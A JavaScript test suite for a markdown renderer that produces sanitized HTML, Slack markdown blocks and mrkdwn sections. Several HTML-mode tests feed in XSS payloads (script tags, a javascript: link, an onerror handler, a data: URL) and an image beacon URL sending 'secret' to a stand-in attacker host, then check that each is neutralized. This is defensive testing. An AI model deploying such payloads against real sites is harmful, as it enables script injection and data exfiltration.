import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  toHtml,
  toSlackBlocks,
  toMrkdwnSections,
  mrkdwnFromCommonMark,
  splitOnBlockBoundaries,
  SLACK_CHUNK,
  MRKDWN_CHUNK
} from '../src/render.js';

// ---------------------------------------------------------------------------
// HTML mode: XSS controls (§9 "Render correctness")
// ---------------------------------------------------------------------------

test('html mode escapes raw <script> (html:false)', () => {
  const out = toHtml('Hello <script>alert(1)</script> world');
  assert.ok(!/<script/i.test(out), 'script tag must not survive');
});

test('html mode strips javascript: links (no executable href)', () => {
  const out = toHtml('[click](javascript:alert(1))');
  // No anchor element may carry a javascript: href (inert escaped text is fine).
  assert.ok(!/<a[^>]*javascript:/i.test(out));
});

test('html mode drops http: and data: schemes in href/src, keeps https', () => {
  const out = toHtml('[a](http://x.test) [b](https://x.test) [c](data:text/html,<b>)');
  assert.ok(out.includes('href="https://x.test"'), 'https link must survive');
  assert.ok(!/(?:href|src)=["']?\s*http:/i.test(out), 'no active http: url');
  assert.ok(!/(?:href|src)=["']?\s*data:/i.test(out), 'no active data: url');
});

test('html mode neutralizes onerror / event handlers (no live element)', () => {
  const out = toHtml('<img src=x onerror=alert(1)>');
  // html:false escapes the raw tag entirely — no live <img> carrying onerror.
  assert.ok(!/<img[^>]*onerror/i.test(out), 'no live img with onerror');
  assert.ok(out.includes('&lt;img'), 'raw html should be escaped to inert text');
});

test('html mode strips remote image src by default (no exfil beacon)', () => {
  const out = toHtml('![pixel](https://attacker.test/?d=secret)');
  assert.ok(!out.includes('attacker.test'), 'remote img src must be stripped');
  assert.ok(out.includes('alt="pixel"') || out.includes('pixel'));
});

test('html mode keeps remote image when explicitly allowed', () => {
  const out = toHtml('![ok](https://cdn.test/a.png)', { allowRemoteImages: true });
  assert.ok(out.includes('https://cdn.test/a.png'));
});

test('html output is a standalone document', () => {
  const out = toHtml('# Title\n\nBody.');
  assert.ok(out.startsWith('<!doctype html>'));
  assert.ok(out.includes('<meta charset="utf-8">'));
  assert.ok(/<h1>Title<\/h1>/.test(out));
});

test('html mode renders tables and inline code', () => {
  const md = '| a | b |\n|---|---|\n| 1 | 2 |\n\nSome `code` here.';
  const out = toHtml(md);
  assert.ok(out.includes('<table>'));
  assert.ok(out.includes('<code>code</code>'));
});

// ---------------------------------------------------------------------------
// Slack mode: chunking under 12k without breaking fences (§9)
// ---------------------------------------------------------------------------

test('small input becomes a single markdown block', () => {
  const blocks = toSlackBlocks('# Hello\n\nWorld');
  assert.equal(blocks.length, 1);
  assert.equal(blocks[0].type, 'markdown');
  assert.equal(blocks[0].text, '# Hello\n\nWorld');
});

test('large input splits into multiple markdown blocks under the limit', () => {
  const para = 'This is a paragraph of text that repeats.\n\n';
  const big = para.repeat(800); // ~33k chars
  const blocks = toSlackBlocks(big);
  assert.ok(blocks.length > 1);
  for (const b of blocks) {
    assert.equal(b.type, 'markdown');
    assert.ok(b.text.length <= SLACK_CHUNK, `chunk too big: ${b.text.length}`);
  }
});

test('chunking never leaves an unterminated fenced code block', () => {
  // One giant fenced code block that must be hard-split.
  const body = Array.from({ length: 3000 }, (_, i) => `line ${i} of code`).join('\n');
  const doc = '```js\n' + body + '\n```';
  const blocks = toSlackBlocks(doc);
  assert.ok(blocks.length > 1, 'expected multiple chunks');
  for (const b of blocks) {
    const fenceCount = (b.text.match(/^```/gm) || []).length;
    assert.equal(fenceCount % 2, 0, `chunk has unbalanced fences:\n${b.text.slice(0, 80)}`);
    assert.ok(b.text.length <= SLACK_CHUNK);
  }
});

test('splitOnBlockBoundaries does not split inside a fenced block with blank lines', () => {
  const fence = '```\n\n\n\nfoo\n\n\n\nbar\n\n\n\n```';
  const text = fence + '\n\n' + 'x'.repeat(SLACK_CHUNK);
  const chunks = splitOnBlockBoundaries(text, SLACK_CHUNK);
  // The fence (with its internal blank lines) must stay within one chunk.
  const withFence = chunks.find((c) => c.includes('foo'));
  assert.ok(withFence.includes('bar'), 'fence body split across chunks');
});

test('returns array even for empty input', () => {
  const blocks = toSlackBlocks('');
  assert.equal(blocks.length, 1);
  assert.equal(blocks[0].text, '');
});

// ---------------------------------------------------------------------------
// mrkdwn fallback (modal invalid_blocks path, §4b.5)
// ---------------------------------------------------------------------------

test('toMrkdwnSections produces valid section blocks under the cap', () => {
  const big = 'A paragraph.\n\n'.repeat(1000);
  const blocks = toMrkdwnSections(big);
  assert.ok(blocks.length > 1);
  for (const b of blocks) {
    assert.equal(b.type, 'section');
    assert.equal(b.text.type, 'mrkdwn');
    assert.ok(b.text.text.length <= MRKDWN_CHUNK);
    assert.ok(b.text.text.length >= 1, 'mrkdwn text must be non-empty');
  }
});

test('toMrkdwnSections never emits empty text for empty input', () => {
  const blocks = toMrkdwnSections('');
  assert.equal(blocks.length, 1);
  assert.ok(blocks[0].text.text.length >= 1);
});

// ---------------------------------------------------------------------------
// CommonMark -> Slack mrkdwn conversion (modal preview)
// ---------------------------------------------------------------------------

test('headings become bold lines (mrkdwn has no headers)', () => {
  assert.equal(mrkdwnFromCommonMark('# Title'), '*Title*');
  assert.equal(mrkdwnFromCommonMark('### Sub heading'), '*Sub heading*');
});

test('bold and strikethrough convert to Slack syntax', () => {
  assert.equal(mrkdwnFromCommonMark('a **bold** b'), 'a *bold* b');
  assert.equal(mrkdwnFromCommonMark('a __bold__ b'), 'a *bold* b');
  assert.equal(mrkdwnFromCommonMark('a ~~gone~~ b'), 'a ~gone~ b');
});

test('links convert to <url|text> and images to alt text', () => {
  assert.equal(mrkdwnFromCommonMark('[site](https://x.test)'), '<https://x.test|site>');
  assert.equal(mrkdwnFromCommonMark('![pixel](https://x.test/p.png)'), 'pixel');
});

test('bullets convert to • markers', () => {
  assert.equal(mrkdwnFromCommonMark('- one\n- two'), '• one\n• two');
});

test('code spans and fences are never rewritten', () => {
  // ** inside inline code must survive verbatim
  assert.equal(mrkdwnFromCommonMark('use `a**b**c` ok'), 'use `a**b**c` ok');
  // a fenced block keeps its body; heading-like lines inside are untouched
  const fenced = '```js\n# not a heading\nconst x = 1;\n```';
  const out = mrkdwnFromCommonMark(fenced);
  assert.ok(out.includes('# not a heading'), 'fenced content must be preserved');
  assert.ok(out.includes('const x = 1;'));
});

test('converted output flows through toMrkdwnSections', () => {
  const blocks = toMrkdwnSections('# Title\n\n**bold** and [l](https://x.test)');
  assert.equal(blocks[0].type, 'section');
  assert.ok(blocks[0].text.text.includes('*Title*'));
  assert.ok(blocks[0].text.text.includes('*bold*'));
  assert.ok(blocks[0].text.text.includes('<https://x.test|l>'));
});
